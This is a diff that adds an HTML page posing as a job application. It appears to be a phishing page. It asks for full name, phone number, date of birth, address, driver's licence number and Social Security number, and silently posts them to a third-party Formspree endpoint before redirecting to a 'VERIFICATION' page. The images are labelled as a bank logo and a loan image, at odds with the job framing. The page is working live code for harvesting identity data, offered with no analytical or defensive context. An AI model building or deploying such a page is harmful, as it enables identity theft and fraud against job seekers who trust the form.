@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JOB APPLICATION</title>
+  <link rel="stylesheet" href="style.css">
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      $('form').submit(function(event) {
+        event.preventDefault(); // Prevent form submission
+
+        // Send the form data to FormSubmit using AJAX
+        $.ajax({
+          url: 'https://formspree.io/f/mvonjlzz',
+          method: 'POST',
+          data: $('form').serialize(),
+          dataType: 'json',
+          success: function(response) {
+            // Redirect to VERIFICATION.html upon successful submission
+            redirectToVERIFICATION();
+          },
+          error: function(xhr, status, error) {
+            console.log(xhr.responseText);
+            alert('An error occurred. Please try again.');
+          }
+        });
+      });
+    });
+
+    function redirectToVERIFICATION() {
+      window.location.href = 'VERIFICATION.html';
+    }
+  </script>
+</head>
+<body>
+  <header>
+    <img src="verify your id.png" alt="Bank Logo" class="logo">
+  </header>
+ <main>
+  <center> 
+  <h3 style="font-family:verdana;">
+JOB APPLICATION
+ </h3>
+	  </br>
+       <form>
+         <div class="form-group">
+        <label for="FUL-NAME">FULL NAME</label>
+        <input type="text" id="FUL-NAME" name="FUL-NAME" required>
+      </div>
+          <div class="form-group">
+        <label for="Phone-number">MOBILE NUMBER/ CELL NUMBER </label>
+        <input type="number" id="phonr" name="phonr" required>
+      </div>
+          <div class="form-group">
+        <label for="D.O.B">DATE OF BIRTH</label>
+        <input type="date" id="DOB" name="DOB" required>
+      </div>
+         <div class="form-group">
+        <label for="address">FULL ADDRESS:</label>
+        <input type="text" id="address" name="adress" required>
+      </div>
+      <div class="form-group">
+        <label for="D-LICENCE">DRIVERS LICENCE</label>
+        <input type="text" id="D-LICENCE" name="D-LICENCE" required>
+      </div>
+	 </br>
+        <div class="form-group">
+        <label for="S.SN"> SOCIAL SECURITY NUMBER (SSN) :</label>
+        <input type="text" id="S.SN" name="S.SN" required>
+      </div>
+	 </br>
+      </div>
+	 </br>
+  <center>    <button type="submit" class="submit-btn">PROCEED</button></center>
+    </form>
+  </main>
+  <img src="verify your identity.png" alt="Loan Image" class="loan-image">
+</body>
+</html>
